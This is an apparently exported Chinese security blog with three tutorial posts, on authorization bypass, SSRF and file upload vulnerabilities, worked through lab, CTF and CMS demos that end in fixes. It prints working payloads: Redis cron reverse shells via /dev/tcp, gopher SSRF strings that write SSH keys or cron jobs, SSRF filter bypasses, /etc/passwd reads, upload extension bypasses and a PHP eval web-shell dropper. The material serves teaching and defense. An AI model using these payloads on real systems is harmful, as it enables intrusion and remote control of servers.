https://www.ccc.com/user1/userfile.php?fileid=user1_name.jpg 这种上传文件后，可以越权查看其他用户的上传文件也是经常发现类似的问题。假设，系统要求我们上传个人的身份证，实名认证信息、购买的发票订单等。如果上传后看到类似如上地址，可以猜测此上传文件可以遍历获取，同过查询fileid来查看其他用户的上传信息。如果上传后文件名如第二种，可能此文件是系统经过重命名的，重命名的方式一般采用当前上传的时间戳或者当前上传的日期加随机字段，这种情况下枚举较为困难，但仍然可以采用注册新用户的方式来查看是否存在越权。顺便一问，如果是www.ccc.com获取信息的方式，还可能会有什么问题呢？ 0x04-5、基于未授权访问的越权举个例子： https://www.xxx.com/user1/user.php?user=user1@user.com 在一些系统上登陆用户后，可以看到类似如上的地址链接，可能你会觉得这个跟问题1类似，但是也有可能多一张问题情况，在非登陆的情况下仍然可以访问到详细信息。如果可以，则证明后端对身份的效验只是基于参数user，并没有效验用户的session是否已登陆。此问题曾发现于一个系统后端支付订单复核的功能中，问题可想而知。 0x04-6、基于功能地址的越权举个例子： https://www.xxx.com/user/getuserinfo.php 如上地址，正常情况下，只访问此后台地址时，一般会跳转到登陆地址，或者登陆后用来查看某个具体的功能，获取数据的情况根据访问的链接地址来，理论上此功能并不存在越权可能，因为没有我们可以修改的参数。但是对权限及功能的限制可能只局限于用户菜单的限制，根据常用链接，可以猜测是否存在以下地址： /getuserorder.php /adduser.php /deluser.php /getalluser.php /todetailpage.php /ordercreate.php ...... 因为在绝大部分系统中，开发为了方便区别功能和页面，通常会利用对应的英文来命名文件，但这些文件并不是任意用户都可以访问到的，所以可以猜测访问地址是否英文的拼接来猜测路径。对于此问题的快捷测试是获取一个高权限账号，当然对于未授权测试来说，很难实现。 0x04-7、基于接口身份的越权举个例子： https://www.xxx.com/user/userinfo.php post: {&#39;userid&#39;:&#39;10001&#39;,&#39;username&#39;:&#39;name&#39;,&#39;userage&#39;:&#39;18&#39;,&#39;usermobile&#39;:&#39;18080808888&#39;} 例如如上接口，修改用户信息，当我们点击某个系统的修改自身资料时，会发送一个类似的json数据包，其中userid对应我们自己的用户id，修改后，可以修改对应id的用户资料。修改方式类似问题1。区别在于一个页面可见，一个页面不直观可见，一个查询，一个修改。需要配合其他越权查询漏洞，或者账号来识别是否修改成功。 0x05、漏洞靶场漏洞环境：phpstudy，webug4.0 靶场介绍：国产靶场，漏洞齐全，演示也相当完善。其中还分为初，中，高。虽然高好像没东西，但仍然是一个不错的靶场环境。 漏洞演示：演示为靶场的22号漏洞，越权修改密码 靶场安装：https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。 把sql目录中的文件安装到数据库，新建三个按照文件名的数据库，导入数据文件，修改data目录下的dbconfig和dbconn文件，修改为自己的数据库账号密码和数据库名。修改完成后建议把网站目录修改为webug的目录下。直接访问本地地址即可。 另外需要修改/control/auth_cross/cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径： header(&quot;Location:/pt_env/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;) 修改为： header(&quot;Location:/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;) 点击第一个越权修改密码后进入如下页面： 此处我打开了数据库来对应查看修改密码的情况，打开webug数据库下的user_test表，可以看到其中有两个用户如下： 此处利用aaaaa用户修改admin用户密码，利用aaaaa账户登陆后，看到如下界面 此处，我们可以先正常走一遍逻辑来查看其中的数据包情况，把aaaaa的密码修改为aaaaa，弹窗OK。然后查看抓取到的数据包。 其中有旧密码和新密码两个参数，理论上如果效验了旧密码和账号的一致性，就算链接中的id可以修改越权也无法修改密码，会提示旧密码不正确，但此处并没有效验旧密码和账号的一致性，导致修改链接中的2为1，post参数不变，或者任意旧密码值，便可以修改admin的密码。 查看数据库修改是否成功： 此处的问题存在两点，一是修改的用户身份由链接中的ID来决定，二是没有对旧密码和账户进行身份验证。 0x06、测试工具对于越权类的安全问题，并没有自动化测试工具来发现和识别，至少现在没有发现哪里有完善的越权检测工具和扫描器。 此处介绍一款burp的越权插件，辅助检测越权漏洞，但是只能检测基于功能的越权，并不能自动的检测需要修改参数来判断越权形式的漏洞。 在burp的Extender选项中选择BApp Store选项卡，找到Authz插件，点击install。安装完成后选项卡中会出现一个Authz的新选项卡，界面如下： 此处需要两个用户身份，假设为A用户和B用户，登陆A用户的账号，获取Cookie到new header中，使用B账号抓包获取信息。到proxy中选择需要测试的功能地址，右键到Send requests to Authz。 获取够需要测试的功能后，到Authz界面点击run即可运行，此处没有设置cookie，那么将按照未授权访问来测试。 其中，会在请求中替换我们输入的cookie值，如图显示，源请求的字节长度，请求的字节长度，源请求的响应码，请求的响应码，通过对响应的差别来查看是否存在越权漏洞。 能达到此检测目的的还有一款插件AuthMatrix，也同样可以检测越权，功能强劲，使用较Authz复杂，对于高要求，多用户，需要对请求中的token等进行选择替换的，可以使用此插件。 介绍地址：https://github.com/portswigger/auth-matrix 0x07、CMS演示0x07-1、前台任意修改其他用户信息漏洞环境：phpstudy，phpcms9.5.9 漏洞介绍：phpcms设计缺陷导致前台用户可以任意修改其他用户密码 漏洞下载：http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip 解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256 在用户模块中添加如下信息，新增两个测试用户，类似如下，需要其中一个可以接收邮件。 在站点首页点击登陆处，如果跳转到404安装页面，可能是你没有删除install安装目录，删除访问index.php即可。选择忘记密码-&gt;用户名找回密码 点击获取邮箱效验码 返回上一步输入想修改的用户，如下test2 输入之前的邮箱验证码提交 点击后显示密码修改成功为以下： 尝试使用新密码登陆成功： 漏洞修复：此问题出现原因在于验证码没有跟账号做绑定，验证时只做了验证码是否有效的判断。对于此类问题，频繁出现在手机号验证码，邮箱验证码处，在最后执行修改时需要一同验证，验证码和手机或者邮箱的对应关系。 0x07-2、redis未授权访问漏洞环境：Ubuntu，reids 3.2.0 漏洞介绍：Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以写入文件来反弹shell 安装如下： wget http://download.redis.io/releases/redis-3.2.0.tar.gz tar xzf redis-3.2.0.tar.gz cd redis-3.2.0 make 修改配置文件 vi redis.conf bind 127.0.0.1 加上# protected-mode yes 改为no 在配置文件目录下启动 ./src/redis-server redis.conf 启动后显示如下： 通过reids命令可以查看基本信息 尝试反弹shell到指定地址 set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.30.79/2333 0&gt;&amp;1\\n&quot; config set dir /var/spool/cron/ config set dbfilename root save 或者采用gopher协议，直接利用curl一条命令执行 0x08、漏洞修复1、验证需要从前端获取的参数，比如用户ID和角色权限名，对于需要根据前台请求来返回数据的参数进行权限效验。 2、对于固定返回信息可以使用特定链接地址返回，同时采用不可预测地址，如：getuserinfo_snhx.php 3、对于需要修改、新增等功能进行判断，根据当前seesion判断用户，参数中只传输修改的用户信息。 4、区分用户和管理员时，不采用某些相同的参数来区别。如dede区分管理和用户都是采用ID值，容易产生问题。 5、对于查询类越权需要对每一次请求的参数做当前用户身份效验，避免水平越权。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"SSRF","slug":"SSRF","date":"2019-06-14T07:46:34.000Z","updated":"2019-06-14T07:58:43.364Z","comments":true,"path":"2019/06/SSRF/","link":"","permalink":"/2019/06/SSRF/","excerpt":"","text":"0x01、漏洞简介​ SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 0x02、漏洞原理​ 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。 0x03、漏洞危害 扫描内网开放服务 向内部任意主机的任意端口发送payload来攻击内网服务 DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 攻击内网的web应用，例如直接SQL注入、XSS攻击等 利用file、gopher、dict协议读取本地文件、执行命令等 0x04、检测与绕过0x04-1、漏洞检测假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下： http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg 那么网站请求的大概步骤应该是类似以下： 用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求的数据加载到前台显示。 这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为： http://www.xxx.com/image.php?image=http://127.0.0.1:22 如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如 http://www.xxx.com/image.php?image=file:///etc/passwd http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2) http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求) ...... 对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中： php: http、https、file、gopher、phar、dict、ftp、ssh、telnet... java: http、https、file、ftp、jar、netdoc、mailto... 判断漏洞是否存在的重要前提是，请求的服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。 http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg 链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。 0x04-2、漏洞出现点 分享：通过url 地址分享文章，例如如下地址： http://share.xxx.com/index.php?url=http://127.0.0.1 通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。 图片加载与下载：通过URL地址加载或下载图片 http://image.xxx.com/image.php?image=http://127.0.0.1 图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。 图片、文章收藏功能 http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de 例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。 利用参数中的关键字来查找 例如以下的关键字： share wap url link src source target u 3g display sourceURl imageURL domain ... 0x04-3、漏洞绕过部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下： 1、限制为http://www.xxx.com 域名时：可以尝试采用http基本身份认证的方式绕过，http://www.xxx.com@www.xxc.com。在对@解析域名中，不同的处理函数存在处理差异，例如：http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。2、限制请求IP不为内网地址：采用短网址绕过，比如百度短地址https://dwz.cn/。采用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1采用进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433 3、限制请求只为http协议： 采用302跳转，百度短地址，或者使用https://tinyurl.com生成302跳转地址。使用如下： 4、其他绕过形式可以查看：https://www.secpulse.com/archives/65832.html 0x05、测试方法漏洞环境：PHP脚本、Windows 利用工具：bash、nc 首先采用如下脚本创建一个PHP的服务端 &lt;?PHP $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_exec($ch); curl_close($ch); ?&gt; 开启PHP的web环境，访问http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。 浏览器访问如下链接：http://localhost/ssrf.php?url=http://127.0.0.1:2233。监听端可以看到来自localhost的请求，请求目标为127.0.0.1的2233端口。 使用gopher协议来查看协议，访问：http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_test 利用gopher发送POST的请求，访问：http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword 以上方式简单的展示了SSRF的攻击过程和请求，下面我们使用回显形SSRF。 漏洞环境：Ubuntu 18、 docker 、PHP、Apache 漏洞文件地址：https://github.com/nikosdano/SSRF-Vulnerable-with-Curl 下载文件放入apache服务器中，访问http://192.168.120.132/awesome_script.php 在其中我们可以填写想要执行的SSRF命令，如填写file:///etc/passwd，回显为： 尝试端口探测，对22端口进行探测是否开启： 截至到此，相信对SSRF已经有了一个简单认识和检测，下面我们利用一个靶场来模拟一个完整的真实的SSRF攻击。 0x06、实战演示漏洞环境：Rootme CTF all the day 漏洞地址：https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/ 利用工具：Burp 漏洞介绍：SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的 访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。 找到一个处于none的虚拟机，点击房间名，如下的ctf04 进入房间后，选择需要创建的虚拟机，选择SSRF Box，点击保存，选择start the game。 过一段时间的等待后，会显示如下信息。 访问 ctf04.root-me.org 就可以看到启动的虚拟环境了 当然，如果在创建虚拟机之前，看到其他的房间有人已经创建了SSRF Box我们也可以加入此玩家的房间，点击房间名，进入房间后点击右上角的Join the game。稍等片刻就可以加入到游戏中，根据提示访问对应的地址就可以开始测试啦。 访问地址后可以看到页面显示一个输入框，需要输入url参数，开始抓包。 尝试在页面输入百度地址后，页面会把百度首页加载进此页面中。 读取系统文件： 使用burp的Intruder模块，来探测开放的服务端口，开放则显示OK，不开放则显示Connection refused。 探测可知内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，此处简单科普一下redis漏洞影响。 详细内容可以查看文章：https://www.freebuf.com/vuls/162035.html Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。 因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。 1、利用redis来写ssh密钥： 此处利用ssh生成一对公私钥，生成的默认文件为id_rsa.pub和id_rsa。把id_rsa.pub上传至服务器即可。我们利用redis把目录设置为ssh目录下： 根据网上写密钥有两种协议可以使用，一种是dict，一种是gopher。测试使用dict协议写不成功，写入后不能连接，此处使用gopher写密钥。 使用的payload为： gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a payload 解码为： gopher://127.0.0.1:6379/_*3 $3 set $1 1 $401 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9 *4 $6 config $3 set $3 dir $11 /root/.ssh/ *4 $6 config $3 set $10 dbfilename $15 authorized_keys *1 $4 save *1 $4 quit payload由joychou的反弹shell修改而来，主要就是替换了写入文件的位置和文件内容。然后修改文件的长度。 然后尝试登陆，输入创建密钥的密码后，登陆成功。 2、利用redis写定时任务来反弹shell 既然提到反弹shell，就需要利用一台外网主机。此处使用了nc做端口监听。 使用payload为以下： gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a 解码后的内容就是： gopher://127.0.0.1:6379/_*3 $3 set $1 1 $61 */1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/spool/cron/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save *1 $4 quit 来自：https://joychou.org/web/phpssrf.html 其中$61为我的vps地址，也就是%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a的字符串长度。执行后稍等片刻就可以收到反弹的shell了。同时需要写入的命令前后要加几个回车。 根据前文的提示，打开/passwd文件就可以找到flag了。 在网站页面上输入这一串字符，就可以结束这场SSRF之旅了。 0x07、CMS实战演示漏洞环境：vulhub、weblogic、ssrf 漏洞介绍：CVE-2014-4210，weblogic的uddiexplorer.war存在安全组件漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性。该漏洞的影响版本包括：10.0.2.0, 10.3.6.0 漏洞下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf 下载vulhub后，进入对应的安装目录，执行docker-compose up -d,会自动创建docker镜像。 构建完成后访问如下地址： /uddiexplorer/SearchPublicRegistries.jsp 访问如下地址时返回，代表端口未开放： /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80 /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 响应可以看到返回404，证明端口开放： 然后可以根据遍历查看开放的端口服务，在根据开放的服务来决定是否能不能执行内网攻击。而实际中越到的SSRF大都是探测类使用，因为能正好搭配使用的情况，而且还可以查看或者反弹的，概率值得讨论。 漏洞修复：1.删除server/lib/uddiexplorer.war下的相应jsp文件。 jar -xvf uddiexplorer.war rm jsp-files jar -cvfM uddiexplorer.war uddiexplorer/ 在官方的漏洞通报上找到补丁安装，https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html 0x08、漏洞修复SSRF漏洞修复： 限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。 对请求地址设置白名单，只允许请求白名单内的地址。 禁用除http和https外的协议，如：file://，gopher://，dict://等 限制请求的端口为固定服务端口，如：80，443 Java类代码修复，来自：joychou 方法调用： String[] urlwhitelist = {&quot;joychou.com&quot;, &quot;joychou.me&quot;}; if (!UrlSecCheck(url, urlwhitelist)) { return; } 方法代码： 需要先添加guava库（目的是获取一级域名） &lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;21.0&lt;/version&gt; &lt;/dependency&gt; 方法实现： public static Boolean UrlSecCheck(String url, String[] urlwhitelist) { try { URL u = new URL(url); // 只允许http和https的协议 if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) { return false; } // 获取域名，并转为小写 String host = u.getHost().toLowerCase(); // 获取一级域名 String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString(); for (String whiteurl: urlwhitelist){ if (rootDomain.equals(whiteurl)) { return true; } } return false; } catch (Exception e) { return false; } }","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2019-05-30T06:11:55.000Z","updated":"2019-06-03T01:50:18.985Z","comments":true,"path":"2019/05/文件上传漏洞/","link":"","permalink":"/2019/05/文件上传漏洞/","excerpt":"","text":"0x01、漏洞简介​ 文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。 0x02、漏洞原理​ 网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。 0x03、漏洞危害​ 恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。 0x04、常用绕过形式0x04-1、文件长传常见点上传头像 上传相册 上传附件 添加文章图片 前台留言资料上传 编辑器文件上传 ...... 例如如下编辑器上传点： 文件管理处文件上传： 前台用户发表文章处文件上传： 个人头像处文件上传： 0x04-2、后缀绕过PHP: php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定) ASP： asa、cer、cdx ASPX： ascx、ashx、asac JSP： jsp、jspx、jspf 0x04-3、绕过类型Content-Type绕过 前端绕过 文件解析规则绕过 Windows环境特性绕过 文件名大小写绕过 双写绕过 点空格绕过 文件头绕过 条件竞争绕过 ...... 在以下的文章介绍中，将采取其中的几种常见的绕过形式做演示。 0x05、漏洞在系统中的差异​ 上传文件漏洞在不同的系统、架构以及行为中，利用形式也是各不相同。常用的web容器有IIS、Tomcat、Nginx、Apache等。以下主要以比较经典的解析漏洞做解释。 0x05-1、IIS 5.x/6.0解析漏洞1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如如下： 漏洞目录利用形式：www.xxx.com/xx.asp/xx.jpg。 xx.jpg的内容可以为一段合法的asp脚本文件。 2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp 漏洞文件利用形式：www.xxx.com/xx.asp;.jpg xx.jpg的内容可以为一段合法的asp脚本文件。 漏洞产生的原因参考详细文章内容：https://www.cnblogs.com/l1pe1/p/9210094.html 通过对IIS6的核心文件类型解析相关文件的逆向后，整理出下面的核心处理代码。 //reverse code by golds7n with ida int __thiscall Url(void *this, char *UrlStruct) { void *pW3_URL_INFO; // esi@1 int bSuccess; // eax@1 const wchar_t *i; // eax@2 wchar_t *wcsSlashTemp; // ebx@6 int wcsTemp; // eax@6 int wcs_Exten; // eax@6 int v8; // esi@9 int v10; // eax@11 int v11; // ST04_4@13 int v12; // eax@13 int ExtenDll; // eax@19 int Extenisa; // eax@20 int ExtenExe; // eax@21 int ExtenCgi; // eax@22 int ExtenCom; // eax@23 int ExtenMap; // eax@24 int Entry; // [sp+Ch] [bp-148h]@6 wchar_t *wcsMaohaoTemp; // [sp+10h] [bp-144h]@6 unsigned int dotCount; // [sp+14h] [bp-140h]@1 wchar_t *Str; // [sp+18h] [bp-13Ch]@3 char *url_FileName; // [sp+1Ch] [bp-138h]@1 char Url_FileExtenName; // [sp+20h] [bp-134h]@1 char v25; // [sp+50h] [bp-104h]@1 dotCount = 0; pW3_URL_INFO = this; STRU::STRU(&amp;Url_FileExtenName, &amp;v25, 0x100u); url_FileName = (char *)pW3_URL_INFO + 228; bSuccess = STRU::Copy((char *)pW3_URL_INFO + 228, UrlStruct); if ( bSuccess &lt; 0 ) goto SubEnd; for ( i = (const wchar_t *)STRU::QueryStr((char *)pW3_URL_INFO + 228); ; i = Str + 1 ) { Str = _wcschr(i, &#39;.&#39;); ***********N1************ if ( !Str ) break; ++dotCount; if ( dotCount &gt; W3_URL_INFO::sm_cMaxDots ) break; bSuccess = STRU::Copy(&amp;Url_FileExtenName, Str); if ( bSuccess &lt; 0 ) goto SubEnd; wcsSlashTemp = _wcschr(Str, &#39;/&#39;); ***********N2************ JUMPOUT(wcsSlashTemp, 0, loc_5A63FD37); wcsTemp = STRU::QueryStr(&amp;Url_FileExtenName); wcsMaohaoTemp = _wcschr((const wchar_t *)wcsTemp, &#39;:&#39;); ***********N3************ JUMPOUT(wcsMaohaoTemp, 0, loc_5A63FD51); wcs_Exten = STRU::QueryStr(&amp;Url_FileExtenName); __wcslwr((wchar_t *)wcs_Exten); if ( META_SCRIPT_MAP::FindEntry(&amp;Url_FileExtenName, &amp;Entry) ) { *((_DWORD *)pW3_URL_INFO + 201) = Entry; JUMPOUT(wcsSlashTemp, 0, loc_5A63FDAD); STRU::Reset((char *)pW3_URL_INFO + 404); break; } if ( STRU::QueryCCH(&amp;Url_FileExtenName) == 4 ) { ExtenDll = STRU::QueryStr(&amp;Url_FileExtenName); if ( !_wcscmp(L&quot;.dll&quot;, (const wchar_t *)ExtenDll) || (Extenisa = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.isa&quot;, (const wchar_t *)Extenisa)) ) JUMPOUT(loc_5A63FD89); ExtenExe = STRU::QueryStr(&amp;Url_FileExtenName); if ( !_wcscmp(L&quot;.exe&quot;, (const wchar_t *)ExtenExe) || (ExtenCgi = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.cgi&quot;, (const wchar_t *)ExtenCgi)) || (ExtenCom = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.com&quot;, (const wchar_t *)ExtenCom)) ) JUMPOUT(loc_5A63FD89); ExtenMap = STRU::QueryStr(&amp;Url_FileExtenName); JUMPOUT(_wcscmp(L&quot;.map&quot;, (const wchar_t *)ExtenMap), 0, loc_5A63FD7B); } } if ( *((_DWORD *)pW3_URL_INFO + 201) || (v10 = *((_DWORD *)pW3_URL_INFO + 202), v10 == 3) || v10 == 2 || (v11 = *(_DWORD *)(*((_DWORD *)pW3_URL_INFO + 204) + 0xC4C), v12 = STRU::QueryStr(url_FileName), bSuccess = SelectMimeMappingForFileExt(v12, v11, (char *)pW3_URL_INFO + 756, (char *)pW3_URL_INFO + 1012), bSuccess &gt;= 0) ) v8 = 0; else SubEnd: v8 = bSuccess; STRU::_STRU(&amp;Url_FileExtenName); return v8; } 以上有三处被标记的位置，这三处是用来检测点号、反斜杠、分号。、 可以理解为的检测流程为： www.xxx.com/xxx.asp;xxx.jpg N1:从头部查找查找&quot;.&quot;号,获得&quot;.asp;xxxx.jpg&quot; N2:查找&quot;;&quot;号,如果有则内存截断 N3:查找&quot;/&quot;,如果有则内存截断 因此，.asp将最终被保存下来，IIS6只简单地根据扩展名来识别，所以从脚本映射表中里查找脚本与扩展名对比，并利用asp.dll来解析。导致最终的问题产生。 对于此问题，微软并不认为这是一个漏洞，同样也没推出IIS6.0解析漏洞的补丁。因此在IIS6.0的网站下，此问题仍然可以尝试是否存在。 0x05-2、Nginx 解析漏洞​ Nginx是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点开发的。 ​ 在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。为什么是由于PHP-CGI的原因呢，因为在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。 ​ 普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问 ”www.xx.com/phpinfo.jpg/1.php” 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了 ​ 在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; 